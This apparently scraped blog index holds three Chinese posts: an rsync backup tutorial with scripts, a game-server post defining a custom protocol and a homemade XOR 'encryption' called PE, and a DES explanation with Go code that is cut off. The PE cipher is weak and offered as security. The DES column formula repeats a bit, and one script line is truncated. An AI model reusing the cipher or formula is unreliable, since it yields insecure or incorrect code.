dokuwiki/lib/plugins/admin.php- dokuwiki/lib/plugins/syntax.php+ dokuwiki/lib/tpl# 不同步系统默认安装的模板- dokuwiki/lib/tpl/default/- dokuwiki/lib/*- dokuwiki/COPYING- dokuwiki/doku.php- dokuwiki/feed.php- dokuwiki/index.php- dokuwiki/install*- dokuwiki/README- dokuwiki/VERSION\n\n下面是同步脚本 &#x2F;root&#x2F;bin&#x2F;backup&#x2F;rsync-dw.sh\n#!/bin/bash###################################### mirror dokuwiki website# $1 --- domain (ex: smartraining.cn)# $2 --- full or update###################################### declare some variableRmtUser=osmondRmtIP=208.113.163.110RmtPath=$1/dokuwikiBackupRoot=/backups/$1Excludes=&quot;--exclude-from=/root/bin/backup/dw-exclude.txt&quot;# use rsync for mirrorif [ &quot;$2&quot; == &quot;full&quot; ]then[ -d /backups/$1 ] || mkdir -p /backups/$1excludesfile=&quot;/tmp/first-excludes&quot;cat &gt; $&#123;excludesfile&#125; &lt;&lt; EOF+ dokuwiki/data/cache/_dummy- dokuwiki/data/cache/*+ dokuwiki/data/locks/_dummy- dokuwiki/data/locks/*+ dokuwiki/data/index/_dummy- dokuwiki/data/index/*EOF/usr/bin/rsync -avzP --exclude-from=$&#123;excludesfile&#125; \\$RmtUser@$RmtIP:$RmtPath $BackupRootelse/usr/bin/rsync -avzP --delete $Excludes \\$RmtUser@$RmtIP:$RmtPath $BackupRootfi\n\n首次备份可以使用类似如下的命令（为了在本地保留一个完整复本）：\n# /root/bin/backup/rsync-dw.sh smartraining.cn full# /root/bin/backup/rsync-dw.sh sinosmond.com full# /root/bin/backup/rsync-dw.sh symfony-project.cn full\n\n可以安排 cron 任务以便日后更新：\n# crontab -e05 1 * * * /root/bin/backup/rsync-dw.sh smartraining.cn25 1 * * * /root/bin/backup/rsync-dw.sh sinosmond.com45 1 * * * /root/bin/backup/rsync-dw.sh symfony-project.cn\n\n普通型增量备份使用 rsync 可以做增量备份。rsync 提供了 -b ––backup-dir 选项，使用这个选项可以将有变化的文件进行更新同时将其旧版本保存在指定的目录中，从而实现增量备份。 下面是对 &#x2F;home 进行增量备份的步骤说明：\n# 第0次备份# 首先复制 /home 目录的内容到备份目录 /backups/daily/home.0，# rsync -a /home/ /backups/daily/home.0# /backups/daily/home.0 总是同步到最新的状态，可以每隔一段时间（如一周）# 对其内容进行打包压缩生成归档文件（完全备份）存在 /backups/archive/。# 第1次备份（此为核心操作）# 将 /home 目录的内容同步到目录 /backups/daily/home.0，# 并将有变化的文件的旧版本保存到 /backups/daily/home.1，# 若每天执行一次，则目录 /backups/daily/home.1 保存了有变化文件一天前的状态。# rsync -a --delete -b --backup-dir=/backups/daily/home.1 /home/ /backups/daily/home.0# 第2次备份# 将备份目录 /backups/daily/home.1 更名为 /backups/daily/home.2# mv /backups/daily/home.1 /backups/daily/home.2# 执行第1次备份的核心操作# 第n次备份# 将早先的备份目录 /backups/daily/home.n 到 /backups/daily/home.1# 依次更名为 /backups/daily/home.(n+1) 到 /backups/daily/home.2# 执行第1次备份的核心操作\n\n下面给出一个增量备份示例脚本。\n#!/bin/bash#========================# 您可以安排 cron 任务执行本脚本# &gt; crontab -e## daily : 1 1 * * * /path/to/script/rsync-backup.sh#========================mydate=&quot;`date &#x27;+%Y%m%d.%H%M&#x27;`&quot;# Define rmt locationRmtUser=rootRmtHost=192.168.0.55RmtPath=/home/BackupSource=&quot;$&#123;RmtUser&#125;@$&#123;RmtHost&#125;:$&#123;RmtPath&#125;&quot;#BackupSource=&quot;/home/&quot;             # 若进行本地备份则用本地路径替换上面的行# Define location of backupBackupRoot=&quot;/backups/$RmtHost/&quot;# BackupRoot=&quot;/backups/localhost/&quot; # 若进行本地备份则用本地路径替换上面的行LogFile=&quot;$&#123;BackupRoot&#125;/backup.log&quot;ExcludeList=&quot;/root/backup/backup-exclude-list.txt&quot;BackupName=&#x27;home&#x27;BackupNum=&quot;7&quot;                      # 指定保留多少个增量备份（适用于每周生成归档文件）#BackupNum=&quot;31&quot;                    # 指定保留多少个增量备份（适用于每月生成归档文件）# 定义函数检查目录 $1 是否存在，若不存在创建之checkDir() &#123;    if [ ! -d &quot;$&#123;BackupRoot&#125;/$1&quot; ] ; then        mkdir -p &quot;$&#123;BackupRoot&#125;/$1&quot;    fi&#125;# 定义函数实现目录滚动# $1 -&gt; 备份路径# $2 -&gt; 备份名称# $3 -&gt; 增量备份的数量rotateDir() &#123;    for i in `seq $(($3 - 1)) -1 1`    do        if [ -d &quot;$1/$2.$i&quot; ] ; then            /bin/rm -rf &quot;$1/$2.$((i + 1))&quot;            mv &quot;$1/$2.$i&quot; &quot;$1/$2.$((i + 1))&quot;        fi    done&#125;# 调用函数 checkDir ，确保目录存在checkDir &quot;archive&quot;checkDir &quot;daily&quot;#======= Backup Begin =================# S1: Rotate daily.rotateDir &quot;$&#123;BackupRoot&#125;/daily&quot; &quot;$BackupName&quot; &quot;$BackupNum&quot;checkDir &quot;daily/$&#123;BackupName&#125;.0/&quot;checkDir &quot;daily/$&#123;BackupName&#125;.1/&quot;mv $&#123;LogFile&#125; $&#123;BackupRoot&#125;/daily/$&#123;BackupName&#125;.1/cat &gt;&gt; $&#123;LogFile&#125; &lt;&lt;_EOF===========================================    Backup done on: $mydate===========================================_EOF# S2: Do the backup and save difference in $&#123;BackupName&#125;.1rsync -av --delete \\    -b --backup-dir=$&#123;BackupRoot&#125;/daily/$&#123;BackupName&#125;.1 \\    --exclude-from=$&#123;ExcludeList&#125; \\    $BackupSource $&#123;BackupRoot&#125;/daily/$&#123;BackupName&#125;.0 \\    1&gt;&gt; $&#123;LogFile&#125; 2&gt;&amp;1# S3: Create an archive backup every weekif [ `date +%w` == &quot;0&quot; ] # 每周日做归档# if [ `date +%d` == &quot;01&quot; ] # 每月1日做归档then    tar -cjf $&#123;BackupRoot&#125;/archive/$&#123;BackupName&#125;-$&#123;mydate&#125;.tar.bz2 \\      -C $&#123;BackupRoot&#125;/daily/$&#123;BackupName&#125;.0 .fi\n\n您可以适当修该上述脚本中变量：\nRmtPath=&quot;$1/&quot;#BackupSource=&quot;$1/&quot;BackupName=&quot;$1&quot;\n\n然后传递脚本参数备份其他目录，例如要备份 &#x2F;www 可以使用如下命令：\n./rsync-backup.sh /www\n\n快照型增量备份使用 rsync 可以做快照（Snapshot）型增量备份。每一个快照都相当于一个完全备份。其核心思想是：对有变化的文件进行复制；对无变化的文件创建硬链接以减少磁盘占用。下面是对 &#x2F;home 进行快照型增量备份的步骤说明：\n# 第0次备份# 首先复制 /home 目录的内容到备份目录 /backups/home.0# rsync -a /home/ /backups/home.0# 第1次备份（此为核心操作）# 以硬链接形式复制 /backups/home.0 到 /backups/home.1# cp -al /backups/home.0 /backups/home.1# 将 /home 目录的内容同步到目录 /backups/home.0# （rsync 在发现变化的文件时，先删除之，然后在创建该文件）# rsync -a --delete /home/ /backups/home.0# 第2次备份# 将备份目录 /backups/home.1 更名为 /backups/home.2# mv /backups/home.1 /backups/home.2# 执行第1次备份的核心操作# 第n次备份# 将早先的备份目录 /backups/home.n 到 /backups/home.1# 依次更名为 /backups/home.(n+1) 到 /backups/home.2# 执行第1次备份的核心操作\n\nrsync 2.5.6 版本之后提供了 ––link-dest 选项，如下两条核心操作命令：\ncp -al /backups/home.0 /backups/home.1rsync -a --delete /home/ /backups/home.0\n\n可以简化为如下的一条命令：\nrsync -a --delete --link-dest=/backups/home.1 /home/ /backups/home.0\n\n下面给出一个快照型增量备份示例脚本，该脚本来自http:&#x2F;&#x2F;www.mikerubel.org/computers/rsync_snapshots&#x2F;contributed&#x2F;peter_schneider-kamp\n#!/bin/bash# ----------------------------------------------------------------------# mikes handy rotating-filesystem-snapshot utility# ----------------------------------------------------------------------# RCS info: $Id: make_snapshot.sh,v 1.6 2002/04/06 04:20:00 mrubel Exp $# ----------------------------------------------------------------------# this needs to be a lot more general, but the basic idea is it makes# rotating backup-snapshots of /home whenever called# ----------------------------------------------------------------------# ------------- system commands used by this script --------------------ID=&#x27;/usr/bin/id&#x27;;ECHO=&#x27;/bin/echo&#x27;;MOUNT=&#x27;/bin/mount&#x27;;RM=&#x27;/bin/rm&#x27;;MV=&#x27;/bin/mv&#x27;;CP=&#x27;/bin/cp&#x27;;TOUCH=&#x27;/usr/bin/touch&#x27;;RSYNC=&#x27;/usr/bin/rsync&#x27;;# ------------- file locations -----------------------------------------MOUNT_DEVICE=/dev/hdb1;SNAPSHOT_RW=/root/snapshots;EXCLUDES=/etc/snapshot_exclude;# ------------- backup configuration------------------------------------BACKUP_DIRS=&quot;/etc /home&quot;NUM_OF_SNAPSHOTS=3BACKUP_INTERVAL=hourly# ------------- the script itself --------------------------------------# make sure we&#x27;re running as rootif (( `$ID -u` != 0 )); then &#123; $ECHO &quot;Sorry, must be root. Exiting...&quot;; exit; &#125; fiecho &quot;Starting snapshot on &quot;`date`# attempt to remount the RW mount point as RW; else abort$MOUNT -o remount,rw $MOUNT_DEVICE $SNAPSHOT_RW ;if (( $? )); then&#123;\t$ECHO &quot;snapshot: could not remount $SNAPSHOT_RW readwrite&quot;;\texit;&#125;fi;# rotating snapshotsfor BACKUP_DIR in $BACKUP_DIRSdo\tNUM=$NUM_OF_SNAPSHOTS\t# step 1: delete the oldest snapshot, if it exists:\tif [ -d $&#123;SNAPSHOT_RW&#125;$&#123;BACKUP_DIR&#125;/$&#123;BACKUP_INTERVAL&#125;.$NUM ] ; then \\\t$RM -rf $&#123;SNAPSHOT_RW&#125;$&#123;BACKUP_DIR&#125;/$&#123;BACKUP_INTERVAL&#125;.$NUM ; \\\tfi ;\tNUM=$(($NUM-1))\t# step 2: shift the middle snapshots(s) back by one, if they exist\twhile [[ $NUM -ge 1 ]]\tdo\t\tif [ -d $&#123;SNAPSHOT_RW&#125;$&#123;BACKUP_DIR&#125;/$&#123;BACKUP_INTERVAL&#125;.$NUM ] ; then \\\t\t\t$MV $&#123;SNAPSHOT_RW&#125;$&#123;BACKUP_DIR&#125;/$&#123;BACKUP_INTERVAL&#125;.$NUM $&#123;SNAPSHOT_RW&#125;$&#123;BACKUP_DIR&#125;/$&#123;BACKUP_IN&#125;\t\tfi;\t\tNUM=$(($NUM-1))\tdone\t# step 3: make a hard-link-only (except for dirs) copy of the latest snapshot,\t# if that exists\tif [ -d $&#123;SNAPSHOT_RW&#125;$&#123;BACKUP_DIR&#125;/$&#123;BACKUP_INTERVAL&#125;.0 ] ; then \\\t\t$CP -al $&#123;SNAPSHOT_RW&#125;$&#123;BACKUP_DIR&#125;/$&#123;BACKUP_INTERVAL&#125;.0 $&#123;SNAPSHOT_RW&#125;$&#123;BACKUP_DIR&#125;/$&#123;BACKUP_INTERVAL&#125;\tfi;\t# step 4: rsync from the system into the latest snapshot (notice that\t# rsync behaves like cp --remove-destination by default, so the destination\t# is unlinked first. If it were not so, this would copy over the other\t# snapshot(s) too!\t$RSYNC \\\t\t-va --delete --delete-excluded \\\t\t--exclude-from=&quot;$EXCLUDES&quot; \\\t\t$&#123;BACKUP_DIR&#125;/ $&#123;SNAPSHOT_RW&#125;$&#123;BACKUP_DIR&#125;/$&#123;BACKUP_INTERVAL&#125;.0 ;\t# step 5: update the mtime of $&#123;BACKUP_INTERVAL&#125;.0 to reflect the snapshot time\t$TOUCH $&#123;SNAPSHOT_RW&#125;$&#123;BACKUP_DIR&#125;/$&#123;BACKUP_INTERVAL&#125;.0 ;done# now remount the RW snapshot mountpoint as readonly$MOUNT -o remount,ro $MOUNT_DEVICE $SNAPSHOT_RW ;if (( $? )); then&#123;\t$ECHO &quot;snapshot: could not remount $SNAPSHOT_RW readonly&quot;;\texit;&#125; fi;\n\n参考\nhttp://rsync.samba.org/examples.html\nhttp://sial.org/howto/rsync/\nhttp://www.linuxsir.org/main/?q=node/256\nhttp://www.dbanotes.net/techmemo/rsync_openssh.html\nhttp://www.mikerubel.org/computers/rsync_snapshots/index.html\nhttp://howtoforge.com/rsync_incremental_snapshot_backups\nhttp://mirror.actusa.net/pub/sample-files/mirror.dist\nhttp://wiki.splitbrain.org/wiki:tips:backup_script\n\n","categories":["env"],"tags":["rsync"]},{"title":"Gsky游戏服务器框架介绍 2","url":"/2021/07/05/dev/game/server/gsky-2/","content":"Gsky游戏服务器框架介绍 2github\n最近跟新了许多代码，目前代码框架如下：\ngsky├── crypto│   ├── pe.cc│   ├── pe.hh│   ├── pmd5.cc│   └── pmd5.hh├── gsky.cc├── gsky.hh├── log│   ├── log.cc│   ├── log.hh│   ├── log_thread.cc│   └── log_thread.hh├── net│   ├── channel.cc│   ├── channel.hh│   ├── epoll.cc│   ├── epoll.hh│   ├── eventloop.cc│   ├── eventloop.hh│   ├── eventloop_thread.cc│   ├── eventloop_thread.hh│   ├── eventloop_threadpool.cc│   ├── eventloop_threadpool.hh│   ├── http│   ├── net.cc│   ├── net.hh│   ├── pp│   │   ├── pp.hh│   │   ├── request.cc│   │   ├── request.hh│   │   ├── response.cc│   │   ├── response.hh│   │   ├── socket.cc│   │   └── socket.hh│   ├── socket.cc│   ├── socket.hh│   ├── util.cc│   └── util.hh├── server.cc├── server.hh├── thread│   ├── condition.hh│   ├── count_down_latch.hh│   ├── mutex_lock.hh│   ├── noncopyable.hh│   ├── thread.cc│   └── thread.hh└── util    ├── firewall.cc    ├── firewall.hh    ├── json.hh    ├── url.hh    ├── util.cc    ├── util.hh    └── vessel.hh\n\n这几天主要是完善 pp (pwnsky protocol)二进制加密传输协议，还有该框架的拓展性。\npp 协议，全称为 pwnsky protocol, 是一款吸收http部分特性的一款二进制传输协议，主要用于游戏长连接交互协议，目前基于tcp来实现。 \n该协议头部只占16字节，相对与http更小，由于协议字段都在固定位置，解析起来更快速。 \npp协议中定义有状态码，数据类型，数据长度，请求路由。 \n采用 pwnsky encryption进行数据加密，由服务端随机生成8字节密钥返回给客户端，客户端接收到之后，在断开之前传输数据都采用该密钥进行加解密。\npp协议是我自己根据http特点来压缩而来的，头部大小只有16字节，目前头部定义字段如下：\n--------------------------------------------------------------------------| magic 2字节 | status 1字节| type 1字节 |  length 4 字节                  |--------------------------------------------------------------------------|                   route 6 字节             |        code 2字节          |--------------------------------------------------------------------------\n\n\n\nmagic: 协议标识，两字节为 “\\x50\\x50”\nstatus: 状态码，包含客户端请求状态码与服务端响应状态码。\ntype: 传输数据类型，类似与http中的Content-Type\nlength: 数据长度\nroute: 请求路由，类似于http url中的path\ncode: 校验码，用于检测传输内容是否符合加密规范。\npp协议目前 c++ 定义如下，后面不断完善协议：\nnamespace pp &#123;enum class status &#123;        // 客户端请求码    connect = 0x10, // 建立连接，请求密钥的过程    data_transfer = 0x11,  // 传输数据    // 服务端响应码    protocol_error = 0x20, // 协议解析错误    too_big = 0x21, // 传输数据过长    invalid_transfer = 0x22, // 无效传输        ok = 0x30, // 请求成功    send_key = 0x31, // 发送密钥    redirct = 0x40, // 重置路由&#125;;// 数据类型enum class data_type &#123;    binary_stream = 0x00, // 二进制数据流    image = 0x01, // 图片    video = 0x02, // 视频    music = 0x03, // 音乐    text = 0x10, // 文本    json = 0x11, // json 数据    xml  = 0x12, // xml 数据&#125;;// 协议头，只占16 字节struct header &#123;    unsigned short magic;    // 协议标识，&quot;PP&quot; 值为0x5050,    unsigned char status;    // 客户端请求码与服务端响应码    unsigned char type;      // 数据类型    unsigned int length;     // 数据长度    unsigned char route[6];  // 请求路由，代替http url中的path    unsigned char code[2];   // 数据校验码&#125;;&#125;\n\n\n\n采用pp协议的gsky服务器连接与客户端过程:\n\n客户端发起获取密钥连接请求\n\n服务端随机生成8字节密钥和2字节code (校验码)，并采用PE (Pwnsky Encryption)以全0的8字节的密钥对内容部分进行加密，也对pp协议头部后8字节也进行单独加密。\n\n客户端收到数据，采用全0 的8字节密钥分别解密协议头部后8字节与内容密钥部分，将其code与密钥储存。\n\n客户端发送数据，在协议头部的code值设置为之前服务端发送过来的code，再分别对内容与头部后8字节采用服服务端发送过来的密钥进行加密，再发送给服务端。\n\n服务端接收数据，采用自己的密钥先进行协议头部后8字节解密，检验code值是否正确，正确之后再根据长度接收数据内容与解密数据内容。\n\n\n大体上连接与传输过程就是这么回事，客户端若不进行密钥获取的话，服务端接收到数据后是直接断开连接的。\n那至于为什么要对协议头部后8字节进行加密，协议头部后8字节包含了 6字节的route与2字节的code，route相当于请求路径，也不希望攻击者通过抓包看到的，所以route有必要进行加盟，code是校验值，有一定程度检测数据与密钥的正确性。\n上面提到了PE加密，PE加密是自己先暂时写的一个对称加密算法，比较简单，采用密钥轮加变换单字节单字节的异或数据，密码算法简单的目的也是处于服务器的处理效率考虑，目前加解密c++实现如下：\nnamespace gsky &#123;namespace crypto &#123;class pe &#123;public:    pe();    ~pe();    void encode(unsigned char key[8], void *raw_data, size_t length);    void decode(unsigned char key[8], void *raw_data, size_t length);    unsigned char xor_table_[256] = &#123;        0xbe, 0xd1, 0x90, 0x88, 0x57, 0x00, 0xe9, 0x53, 0x10, 0xbd, 0x2a, 0x34, 0x51, 0x84, 0x07, 0xc4,         0x33, 0xc5, 0x3b, 0x53, 0x5f, 0xa8, 0x5d, 0x4b, 0x6d, 0x22, 0x63, 0x5d, 0x3c, 0xbd, 0x47, 0x6d,         0x22, 0x3f, 0x38, 0x4b, 0x7a, 0x4c, 0xb8, 0xcc, 0xb8, 0x37, 0x78, 0x17, 0x73, 0x23, 0x27, 0x71,         0xb1, 0xc7, 0xa6, 0xd1, 0xa0, 0x48, 0x21, 0xc4, 0x1b, 0x0a, 0xad, 0xc9, 0xa5, 0xe6, 0x14, 0x18,         0xfc, 0x7b, 0x53, 0x59, 0x8b, 0x0d, 0x07, 0xcd, 0x07, 0xcc, 0xbc, 0xa5, 0xe0, 0x28, 0x0e, 0xf9,         0x31, 0xc8, 0xed, 0x78, 0xf4, 0x75, 0x60, 0x65, 0x52, 0xb4, 0xfb, 0xbf, 0xac, 0x6e, 0xea, 0x5d,         0xca, 0x0d, 0xb5, 0x66, 0xac, 0xba, 0x06, 0x30, 0x95, 0xf4, 0x96, 0x42, 0x7a, 0x7f, 0x58, 0x6d,         0x83, 0x8e, 0xf6, 0x61, 0x7c, 0x0e, 0xfd, 0x09, 0x6e, 0x42, 0x6b, 0x1e, 0xb9, 0x14, 0x22, 0xf6,         0x16, 0xd2, 0xd2, 0x60, 0x29, 0x23, 0x32, 0x9e, 0xb4, 0x82, 0xee, 0x58, 0x3a, 0x7d, 0x1f, 0x74,         0x98, 0x5d, 0x17, 0x64, 0xe4, 0x6f, 0xf5, 0xad, 0x94, 0xaa, 0x89, 0xe3, 0xbe, 0x98, 0x91, 0x38,         0x70, 0xec, 0x2f, 0x5e, 0x9f, 0xc9, 0xb1, 0x26, 0x3a, 0x64, 0x48, 0x13, 0xf1, 0x1a, 0xc5, 0xd5,         0xe5, 0x66, 0x11, 0x11, 0x3a, 0xaa, 0x79, 0x45, 0x42, 0xb4, 0x57, 0x9d, 0x3f, 0xbc, 0xa3, 0xaa,         0x98, 0x4e, 0x6b, 0x7a, 0x4a, 0x2f, 0x3e, 0x10, 0x7a, 0xc5, 0x33, 0x8d, 0xac, 0x0b, 0x79, 0x33,         0x5d, 0x09, 0xfc, 0x9d, 0x9b, 0xe5, 0x18, 0xcd, 0x1c, 0x7c, 0x8b, 0x0a, 0xa8, 0x95, 0x56, 0xcc,         0x4e, 0x34, 0x31, 0x33, 0xf5, 0xc1, 0xf5, 0x03, 0x0a, 0x4a, 0xb4, 0xd1, 0x90, 0xf1, 0x8f, 0x57,         0x20, 0x05, 0x0d, 0xa0, 0xcd, 0x82, 0xb3, 0x25, 0xd8, 0xd2, 0x20, 0xf3, 0xc5, 0x96, 0x35, 0x35,     &#125;;&#125;;&#125;&#125;\n\n\n\n#include &lt;gsky/crypto/pe.hh&gt;gsky::crypto::pe::pe() &#123;    &#125;gsky::crypto::pe::~pe() &#123;    &#125;// key length is 8 bytes// 加密概述// 采用密钥重叠循环，查表来进行异或。//void gsky::crypto::pe::encode(unsigned char key[8], void *raw_data, size_t length) &#123;    unsigned char keys[8];    memcpy(keys, key, 8);    char *data = (char *)raw_data;    for(int i = 0; i &lt; length; i ++) &#123;        data[i] ^= keys[i % 8];        unsigned char n = ((keys[i % 8] + keys[(i + 1) % 8]) * keys[(i + 2) % 8]) &amp; 0xff;        data[i] ^= n ^ xor_table_[n];        keys[i % 8] = (n * 2 + 3) % 0x100;    &#125;&#125;// 解密void gsky::crypto::pe::decode(unsigned char key[8], void *raw_data, size_t length) &#123;    unsigned char keys[8];    memcpy(keys, key, 8);    char *data = (char *)raw_data;    for(int i = 0; i &lt; length; i ++) &#123;        char t_key = keys[i % 8];        unsigned char n = ((keys[i % 8] + keys[(i + 1) % 8]) * keys[(i + 2) % 8]) &amp; 0xff;        data[i] ^= n ^ xor_table_[n];        data[i] ^= t_key;        keys[i % 8] = (n * 2 + 3) % 0x100;    &#125;&#125;\n\n\n\n\n\n协议拓展部分，为了更方便的自定义传输协议，我对框架进行了比较大的整改，在net模块目前有:\n├── net│   ├── channel.cc│   ├── channel.hh│   ├── epoll.cc│   ├── epoll.hh│   ├── eventloop.cc│   ├── eventloop.hh│   ├── eventloop_thread.cc│   ├── eventloop_thread.hh│   ├── eventloop_threadpool.cc│   ├── eventloop_threadpool.hh│   ├── http // http解析，有待实现│   ├── net.cc│   ├── net.hh│   ├── pp  // pp解析│   │   ├── pp.hh│   │   ├── request.cc│   │   ├── request.hh│   │   ├── response.cc│   │   ├── response.hh│   │   ├── socket.cc│   │   └── socket.hh│   ├── socket.cc │   ├── socket.hh│   ├── util.cc│   └── util.hh\n\n\n\n上面部分主要是从net::socket类进行协议的分支，该类主要是相当与一个epoll架构的单纯tcp套接子处理，基于tcp之上，再对数据进行协议解析，为了让库更好的拓展，我特意模仿了golang语言中的http库写了两个类request类和response类，request类是存储客户端请求信息，response类是让数据发送给客户端的封装接口。\n目前来说pp协议服务端已经基本差不多了，只是pp协议客户端还有待实现一下sdk，方便接入gsky服务器。\n","categories":["dev"],"tags":["server"]},{"title":"DES加解密-简单原理与go语言实现","url":"/2021/07/02/security/crypto/des/","content":"DES加解密-简单原理与go语言实现注: 这个是最近的工程实践作业，根据书上理解原理后采用golang语言来实现的。\n参考: [1] 应用密码学 (卓越工程师计划) 张仕斌 编著\n该篇博客无图片，若需查看测试及图片请访问原版: https://cloud.tencent.com/developer/article/1840557\nDES加密原理\n对明文进行分组-&gt; 每8字节为一组\n\n对明文进行IP置换，接下来就像轮结构变换了\n\n轮结构变换\n\n\n公式: Li &#x3D; R(i - 1), Ri &#x3D; L(i - 1) ^ F(R(i - 1), Ki)\n其中L是左边32bit，也就是低32bit，R为高32bit，这里采用大端表示。\nF为轮加密函数，包括如下\n\nR(i - 1)进行E盒拓展为48bit\n\n与子密钥进行异或\n\n再进行S盒子压缩为32bit\n\n再对这32bit进行P盒置换\n\n\n经过一次轮变化输出的32bit进行与L- i异或的到Ri， 而Li则为 R(i - 1)\n依次不断重复以上轮加密。\n但由于涉及每论结构变换的时候，子密钥都要得重新生成，\n子密钥生成过程如下：\n\n经过置换选择PC - 1从64bit变换至56bit，将8bit的校验位去掉。\n\n的到的数据分成两组，C0和D0，各28bit\n\nC0与D0分别循环左移，得到C1和D0组装为56bit进行置换选择PC - 2的到子密钥1\n\n再对C1和D1的到C2和D2分别循环左移组装为56bit进行置换选择PC - 2的到子密钥2\n\n\n不断重复上面步骤16次，即可得到16轮次的子密钥。\n再采用这些子密钥作为轮结构变换的每轮的子密钥，经过16论后，即可获得加密后64bit的密文了。\n经过16轮加密后，32bit交换组装为64bit，再进行IP逆向置换。\nDES加密原理\n与加密原理相同，唯一不同的地方就是生成子密钥后，在轮加密的使用顺序相反。\n开发环境Arch linux\nLinux version 5.12.12-arch1-1 (linux@archlinux) \nGolang\ngo version go1.16.5 linux&#x2F;amd64\n代码准备为了能够更好的调试，下面我增加了两个主要函数，binStrToIntB和PrintInt64B，binStrToIntB功能是将字符串以大端方式转化为64bit的数值类型，PrintInt64B是将64bit的数值类型以大端方式进行打印出来，也就是左边为低位，右边为高位，方便后续调试与查看。\nIP置换实现IP置换表中的值代表是第几bit的值，采用目前第几个bit索引值i1 进行查IP置换表后得到bit索引 i2，再根据这个i2查本身自己对应的该bit位，替换当前 i1位置的bit值。\n根据教科书上的例子进行编写与测试\nE盒拓展置换实现通过得到的R32 bit进行E盒拓展置换。\n从32bit拓展到48bit，将该eBox表中对于的bit位放入该索引bit位置中\n将E盒拓展的48bit结果与子密钥异或传入S盒置换中。\nS盒压缩实现  S 盒压缩，将48bit压缩为32bit\n 将48bit分为8组，每组6bit\n 该组的第一个bit位与第6个bit位 组成S盒行号\n 中间4bit位 组成S盒列号\n 计算公式: \n r &#x3D; b1 * 2 + b6\n c &#x3D; b2 &lt;&lt; 3 + b3 &lt;&lt; 2 + b3 &lt;&lt; 1 + b4\n 根据行号和列好查询的到4bit的二进制数，对该二进制数进行大端处理即可完毕S盒\nP盒置换实现原理与之前的IP置换一样，只是位数和表不同。\n子密钥匙生成-过程子密钥生成部分，获取64bit的密钥后，经过PC1置换，获取56bit有效位，分成两组28bit，分别C0，D0。\nC0，D0通过循环左移得到C1，D1，组装在一起，经过PC2置换得到第一轮子密钥。\nC1与D1经过循环左移，得到C2，D2,组装在一起，经过PC2置换得到第二轮密钥，以此类推，得到下一轮密钥。\n子密钥匙生成-置换选择PC1将64bit的密钥取出56bit的有效位。\n子密钥匙生成-循环左移经过PC1置换后，将56bit拆分为C0和D0，各28bit，再经过置换选择PC2。\n结尾处理-IP逆置换IP逆置换，经过16轮变换之后，得到64bit数据，最后一步是IP逆置换。\nIP逆置换正好是IP置换的逆。\n经过IP逆置换后，即完成本组加密。\n整体加密实现思路是先填充为8的倍数长度，依次对没8字节进行分组加密。\n先进行16轮所需密钥生成-&gt;IP置换-&gt; 16次轮加密-&gt;IP逆置换\n解密实现与加密思路一样，唯一不同的地方在于密钥生成后在轮加密使用时的顺序相反。\n完整代码package mainimport (    &quot;fmt&quot; )// 是否为debug模式var debug bool = false// 二进制字符串转换至 Int, Left Low, Right High, Bigger模式输入func BinStrToIntB(bin string) uint64 &#123;   var ret uint64 = 0    length := len(bin)    j := 0   for i := 0; i &lt; length; i ++ &#123;        if(bin[i] == &#x27; &#x27;) &#123;            continue        &#125;        ret |= (uint64)(bin[i] - &#x27;0&#x27; ) &lt;&lt; j        j ++   &#125;   return ret&#125;// 以大端模式打印64位二进制bit位func PrintInt64B(str string, num uint64) &#123;   // 反转bit位    var out uint64 = 0     t := 64    for i := 0; i &lt; t; i ++ &#123;        out |= ((uint64)((num &gt;&gt; i )&amp; 0x1)) &lt;&lt; (t - i - 1)    &#125;    fmt.Printf(&quot;%s : %064b\\n&quot;, str, out)&#125;// 以大端模式打印56位二进制bit位func PrintInt56B(str string, num uint64) &#123;   // 反转bit位    var out uint64 = 0     t := 56    for i := 0; i &lt; t; i ++ &#123;        out |= ((uint64)((num &gt;&gt; i )&amp; 0x1)) &lt;&lt; (t - i - 1)    &#125;    fmt.Printf(&quot;%s : %056b\\n&quot;, str, out)&#125;// 以大端模式打印48位二进制bit位func PrintInt48B(str string, num uint64) &#123;   // 反转bit位    var out uint64 = 0     t := 48    for i := 0; i &lt; t; i ++ &#123;        out |= ((uint64)((num &gt;&gt; i )&amp; 0x1)) &lt;&lt; (t - i - 1)    &#125;    fmt.Printf(&quot;%s : %048b\\n&quot;, str, out)&#125;// 以大端模式打印32位二进制bitfunc PrintInt32B(str string, num uint32) &#123;   // 反转bit位    var out uint64 = 0     t := 32    for i := 0; i &lt; t; i ++ &#123;        out |= ((uint64)((num &gt;&gt; i )&amp; 0x1)) &lt;&lt; (t - i - 1)    &#125;    fmt.Printf(&quot;%s : %032b\\n&quot;, str, out)&#125;// 以大端模式打印28位二进制bitfunc PrintInt28B(str string, num uint32) &#123;   // 反转bit位    var out uint64 = 0     t := 28    for i := 0; i &lt; t; i ++ &#123;        out |= ((uint64)((num &gt;&gt; i )&amp; 0x1)) &lt;&lt; (t - i - 1)    &#125;    fmt.Printf(&quot;%s : %028b\\n&quot;, str, out)&#125;// IP置换/*IP置换表中的值代表是第几bit的值，采用目前第几个bit索引值i1 进行查IP置换表后得到bit索引 i2，再根据这个i2查本身自己对应的该bit位，替换当前 i1位置的bit值。*/func IPRplace(num uint64) uint64 &#123;    var IPTable = [64]uint8 &#123;        58,50,42,34,26,18,10,2,        60,52,44,36,28,20,12,4,        62,54,46,38,30,22,14,6,        64,56,48,40,32,24,16,8,        57,49,41,33,25,17,9,1,        59,51,43,35,27,19,11,3,        61,53,45,37,29,21,13,5,        63,55,47,39,31,23,15,7,&#125;    var out uint64 = 0    for i := 0; i &lt; 64; i ++ &#123;        out |= (num &gt;&gt; (uint64(IPTable[i] - 1)) &amp; 0x1) &lt;&lt; i    &#125;    return out&#125;// E盒子拓展:/*    从32bit拓展到48bit    将该eBox表中对于的bit位放入该索引bit位置中*/func E_Expand(num uint32) uint64&#123;\tvar eBox = [48]uint8&#123;        32,1 ,2 ,3 ,4 ,5,        4 ,5 ,6 ,7 ,8 ,9,        8 ,9 ,10,11,12,13,        12,13,14,15,16,17,        16,17,18,19,20,21,        20,21,22,23,24,25,        24,25,26,27,28,29,        28,29,30,31,32,1 ,    &#125;    var out uint64 = 0    for i := 0; i &lt; 48; i ++ &#123;        out |= (uint64)((num &gt;&gt; (eBox[i] - 1)) &amp; 1) &lt;&lt; i    &#125;    return out &#125;/*    S 盒压缩，将48bit压缩为32bit    将48bit分为8组，每组6bit    该组的第一个bit位与第6个bit位 组成S盒行号    中间4bit位 组成S盒列号    计算公式:     r = b1 * 2 + b6    c = b2 &lt;&lt; 3 + b3 &lt;&lt; 2 + b3 &lt;&lt; 1 + b4    